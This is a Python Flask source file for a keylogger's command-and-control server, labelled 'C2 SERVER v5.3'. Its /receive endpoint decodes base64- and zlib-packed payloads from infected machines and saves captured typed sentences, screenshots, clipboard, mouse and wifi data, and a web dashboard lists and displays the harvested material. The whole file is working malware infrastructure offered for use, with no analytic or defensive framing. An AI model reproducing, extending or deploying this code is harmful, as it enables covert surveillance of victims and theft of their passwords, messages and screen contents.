import traceback
from flask import Flask, request, jsonify, send_from_directory, Response
import base64
import zlib
import json
import os
import datetime

app = Flask(__name__, static_folder=None)

BASE_DIR = "c2_data"
for folder in ["logs", "screenshots", "keys"]:
    os.makedirs(f"{BASE_DIR}/{folder}", exist_ok=True)

def decrypt_payload(data_b64):
    """Decode agent payload: Base64 -> zlib -> JSON"""
    try:
        data_bytes = base64.b64decode(data_b64)
        decompressed = zlib.decompress(data_bytes).decode('utf-8')
        return json.loads(decompressed)
    except Exception as e:
        print(f"❌ DECODE ERROR: {e}")
        return None

@app.route("/receive", methods=["POST"])
def receive():
    """Main C2 endpoint - receives ALL keylogger data"""
    try:
        print("\n" + "="*60)
        print("🔍 INCOMING PAYLOAD:")
        print(f"  Session: {request.json.get('session', 'NONE')}")
        print(f"  Data len: {len(request.json.get('data', '')) if request.json.get('data') else 0}")
        
        payload_encrypted = request.json.get("data")
        session_id = request.json.get("session", "unknown")
        
        if not payload_encrypted:
            print("❌ NO PAYLOAD DATA")
            return jsonify({"error": "No data"}), 400
        
        payload = decrypt_payload(payload_encrypted)
        if not payload:
            print("❌ PAYLOAD DECODE FAILED")
            return jsonify({"error": "Decode failed"}), 400
        
        # ✅ EXTRACT CURRENT KEYLOGGER STRUCTURE
        system = payload.get("system", {})
        sentences = payload.get("sentences", [])
        screenshots = payload.get("screenshots", [])
        mouse = payload.get("mouse", [])
        clipboard = payload.get("clipboard", [])
        wifi = payload.get("wifi", [])
        
        print(f"  ✅ PARSED: {len(sentences)} sentences | {len(screenshots)} shots")
        print(f"  Session ID: {system.get('session_id', session_id)}")
        
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        session_name = system.get('session_id', session_id)
        
        # 1️⃣ SAVE COMPLETE RAW JSON LOG
        log_file = f"{BASE_DIR}/logs/{session_name}_{ts}.json"
        with open(log_file, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, ensure_ascii=False)
        
        # 2️⃣ SAVE ALL SCREENSHOTS
        saved_shots = 0
        for shot in screenshots:
            try:
                shot_filename = f"{session_name}_{shot.get('id', saved_shots)}_{ts}.jpg"
                shot_path = f"{BASE_DIR}/screenshots/{shot_filename}"
                img_data = base64.b64decode(shot["data"])
                with open(shot_path, "wb") as f:
                    f.write(img_data)
                saved_shots += 1
            except Exception as e:
                print(f"  ❌ Shot save error: {e}")
        
        # 3️⃣ SAVE ORGANIZED SENTENCES AS TXT
        if sentences:
            keys_file = f"{BASE_DIR}/keys/{session_name}_{ts}.txt"
            with open(keys_file, "w", encoding="utf-8") as f:
                f.write(f"[{ts}] {system.get('hostname', 'unknown')} - {len(sentences)} sentences\n")
                f.write("="*80 + "\n\n")
                for sentence in sentences:
                    f.write(f"TIME: {sentence.get('time', 'N/A')}\n")
                    f.write(f"SENTENCE: {sentence.get('sentence', '')}\n")
                    f.write(f"STATS: {sentence.get('len', 0)} chars, {sentence.get('words', 0)} words\n")
                    f.write("-" * 40 + "\n\n")
        
        print(f"✅ SAVED: {len(sentences)} sentences → keys/ | {saved_shots} shots → screenshots/")
        print("="*60)
        
        # ✅ KEYLOGGER EXPECTS THIS EXACT RESPONSE
        return jsonify({
            "sentences": len(sentences),
            "shots": saved_shots,
            "status": "received"
        }), 200
        
    except Exception as e:
        print(f"❌ SERVER CRASH: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": str(e)}), 500

@app.route("/")
def dashboard():
    """🚀 ULTIMATE C2 DASHBOARD - UNLIMITED VIEW"""
    try:
        # GET ALL FILES
        all_shots = [f for f in os.listdir(f"{BASE_DIR}/screenshots") if f.endswith('.jpg')]
        all_keylogs = [f for f in os.listdir(f"{BASE_DIR}/keys") if f.endswith('.txt')]
        all_logs = [f for f in os.listdir(f"{BASE_DIR}/logs") if f.endswith('.json')]
        
        all_shots.sort(reverse=True)
        all_keylogs.sort(reverse=True)
        all_logs.sort(reverse=True)
        
        # PAGINATION
        page = int(request.args.get('page', 1))
        view = request.args.get('view', 'recent')  # recent/all/mobile
        limit = {'mobile':12, 'recent':24, 'all':100}[view] if view != 'all' else 999
        
        shots_page = all_shots[(page-1)*limit:page*limit]
        
        total_shots = len(all_shots)
        total_keys = len(all_keylogs)
        total_logs = len(all_logs)
        
        # GENERATE SHOTS GRID
        shots_html = ""
        for shot in shots_page:
            shots_html += f'''
            <div class="shot">
                <a href="/shots/{shot}" target="_blank">
                    <img src="/shots/{shot}" alt="{shot}" loading="lazy">
                </a>
                <div title="{shot}">{shot[:30]}...</div>
            </div>'''
        
        # TOP 20 KEYLOGS
        keys_html = ""
        for i, keylog in enumerate(all_keylogs[:20]):
            keys_html += f'''
            <div class="keylog">
                <a href="/keys/{keylog}" target="_blank">#{i+1} {keylog}</a>
            </div>'''
        
        # VIEW TABS
        tabs = ""
        for v, label in [('mobile', '📱 Mobile (12)'), ('recent', '🖥️ Recent (24)'), ('all', '🔥 ALL SHOTS')]:
            active = "active" if v == view else ""
            tabs += f'<a href="/?view={v}&page=1" class="tab {active}">{label}</a>'
        
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>🔥 C2 DASHBOARD v5.3 - UNLIMITED</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{font-family:'Courier New',monospace;background:linear-gradient(135deg,#000,#111);color:#0f0;padding:20px;min-height:100vh}}
        .header{{text-align:center;margin:2rem 0}}
        h1{{font-size:3em;text-shadow:0 0 30px #0f0;margin-bottom:1rem}}
        .stats{{display:flex;justify-content:center;gap:2rem;font-size:1.3em;margin-bottom:2rem;padding:1.5rem;background:#111;border-radius:15px;border:2px solid #333;flex-wrap:wrap}}
        .tabs{{display:flex;justify-content:center;gap:1rem;margin:2rem 0;flex-wrap:wrap}}
        .tab{{padding:1rem 2rem;background:#222;border:2px solid #333;border-radius:25px;color:#0f0;text-decoration:none;font-weight:bold;transition:all 0.3s}}
        .tab:hover,.tab.active{{background:#0a420a;border-color:#0f0;transform:scale(1.05)}}
        .shots-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1.5rem;margin-bottom:2rem}}
        .shot{{background:#1a1a1a;padding:1rem;border-radius:15px;border:2px solid #333;transition:all 0.3s;cursor:pointer}}
        .shot:hover{{transform:translateY(-8px);border-color:#0f0;box-shadow:0 15px 30px rgba(0,255,0,0.3)}}
        .shot img{{width:100%;height:180px;object-fit:cover;border-radius:10px}}
        .shot div{{margin-top:0.8rem;font-size:0.9em;color:#aaa;overflow:hidden;text-overflow:ellipsis}}
        .sections{{display:grid;grid-template-columns:1fr 1fr;gap:3rem;margin-top:3rem}}
        .keylogs,.logs{{background:#1a1a1a;padding:2rem;border-radius:15px;border-left:6px solid #0f0;max-height:500px;overflow-y:auto}}
        .keylogs h2,.logs h2{{margin-bottom:1.5rem;font-size:1.6em}}
        .keylog,.log-item{{padding:1rem;margin:0.8rem 0;background:#000;border-radius:10px;cursor:pointer;transition:all 0.3s}}
        .keylog:hover,.log-item:hover{{background:#0a420a;box-shadow:0 5px 15px rgba(0,255,0,0.2)}}
        .keylog a,.log-item a{{color:#0f0;text-decoration:none;font-size:1.1em}}
        .pagination{{text-align:center;padding:2rem;font-size:1.2em}}
        .live{{animation:pulse 2s infinite}}
        @keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:0.5}}}}
        @media(max-width:1200px){{.sections{{grid-template-columns:1fr}}}}
        @media(max-width:768px){{.stats{{flex-direction:column;gap:1rem}} .tabs{{flex-direction:column;align-items:center}}}}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 ULTIMATE C2 DASHBOARD v5.3</h1>
        <div class="stats">
            <div>📸 <strong>{total_shots}</strong> TOTAL Shots</div>
            <div>⌨️ <strong>{total_keys}</strong> Sentences</div>
            <div>📁 <strong>{total_logs}</strong> Logs</div>
            <div class="live">🟢 LIVE</div>
        </div>
        <div class="tabs">{tabs}</div>
        <div style="font-size:1.1em;color:#aaa">Page {page} | View: {view.upper()} | {len(shots_page)}/{total_shots} shots</div>
    </div>
    
    <div class="shots-grid">{shots_html}</div>
    
    <div class="pagination">
        {'<a href="/?view={view}&page={page-1}" style="color:#0f0;font-size:1.5em;margin:0 2rem">⬅️ PREV</a>'.format(view=view, page=page-1) if page > 1 else ''}
        <a href="/?view={view}&page=1" style="color:#fff">🏠 HOME</a>
        {'<a href="/?view={view}&page={page+1}" style="color:#0f0;font-size:1.5em;margin:0 2rem">NEXT ➡️</a>'.format(view=view, page=page+1) if len(shots_page)==limit else ''}
    </div>
    
    <div class="sections">
        <div class="keylogs">
            <h2>⌨️ Sentences ({total_keys} total - Top 20)</h2>
            {keys_html}
        </div>
        <div class="logs">
            <h2>📁 Raw Logs ({total_logs} total - Top 10)</h2>
            {''.join([f'<div class="log-item"><a href="/logs/{log}" target="_blank">#{i+1} {log}</a></div>' 
                     for i, log in enumerate(all_logs[:10])])}
        </div>
    </div>
    
    <script>
        document.addEventListener('keydown', e => {{
            if(e.key==='r' && e.ctrlKey) location.reload();
            if(e.key==='m' && e.ctrlKey) window.open('/?view=mobile', '_blank');
        }});
        setTimeout(()=>location.reload(), 30000);
    </script>
</body>
</html>
        """
        return html
        
    except Exception as e:
        return f"<pre style='color:#f00;font-size:1.5em'>{e}\n\n{traceback.format_exc()}</pre>", 500

# STATIC FILE SERVERS
@app.route("/shots/<path:filename>")
def serve_shot(filename):
    return send_from_directory(f"{BASE_DIR}/screenshots", filename)

@app.route("/keys/<path:filename>")
def serve_key(filename):
    try:
        filepath = f"{BASE_DIR}/keys/{filename}"
        if os.path.exists(filepath):
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
            content = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            content = content.replace('\n', '<br>').replace('  ', '&nbsp;&nbsp;')
            return f"""
<!DOCTYPE html>
<html><head><title>⌨️ {filename}</title>
<style>body{{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:3rem;font-size:16px;line-height:1.6}}
pre{{background:#111;padding:3rem;border-radius:20px;border:3px solid #333;max-height:85vh;overflow:auto;white-space:pre-wrap}}</style>
</head><body>
<a href="/" style="position:fixed;top:2rem;left:2rem;font-size:2.5em;color:#0f0">🏠</a>
<h1 style="color:#0f0;margin-bottom:2rem">{filename}</h1><pre>{content}</pre></body></html>
            """
    except: pass
    return "File not found", 404

@app.route("/logs/<path:filename>")
def serve_log(filename):
    try:
        filepath = f"{BASE_DIR}/logs/{filename}"
        if os.path.exists(filepath):
            with open(filepath, "r", encoding="utf-8") as f:
                content = json.dumps(json.load(f), indent=2)
            content = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            content = content.replace('\n', '<br>').replace('  ', '&nbsp;&nbsp;')
            return f"""
<!DOCTYPE html>
<html><head><title>📁 {filename}</title>
<style>body{{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:3rem;font-size:14px;line-height:1.4}}
pre{{background:#111;padding:3rem;border-radius:20px;border:3px solid #333;max-height:85vh;overflow:auto;white-space:pre-wrap}}</style>
</head><body>
<a href="/" style="position:fixed;top:2rem;left:2rem;font-size:2.5em;color:#0f0">🏠</a>
<h1 style="color:#0f0;margin-bottom:2rem">{filename}</h1><pre>{content}</pre></body></html>
            """
    except: pass
    return "File not found", 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print("🚀 C2 SERVER v5.3 LIVE!")
    print("📁 Data: c2_data/ (logs/ | screenshots/ | keys/)")
    print("🌐 Dashboard: http://0.0.0.0:" + str(port))
    print("🔍 DEBUG: Watch console for incoming payloads")
    print("-" * 60)
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)